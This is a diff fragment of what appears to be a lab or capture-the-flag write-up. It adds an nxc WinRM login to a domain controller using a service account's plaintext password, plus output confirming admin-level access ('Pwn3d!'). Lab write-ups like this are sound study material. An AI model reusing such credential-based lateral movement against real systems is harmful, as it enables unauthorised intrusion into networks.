@@ -634,3 +634,15 @@ SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  [+] corp.darkhaven.tech\ldap
 ```
 This user is an admin on `dc02`
 
+```python
+nxc winrm dc02.corp.darkhaven.tech -u 'ldap_svc' -p 'D@rkhav3nLDAP2024!'
+WINRM       10.10.10.5      5985   EC2AMAZ-KK0CT8N  [*] Windows 11 / Server 2025 Build 26100 (name:EC2AMAZ-KK0CT8N) (domain:corp.darkhaven.tech) 
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.10.10.5      5985   EC2AMAZ-KK0CT8N  [+] corp.darkhaven.tech\ldap_svc:D@rkhav3nLDAP2024! (Pwn3d!)
+```
+This user also has access over winrm
+
+```python
+
+```
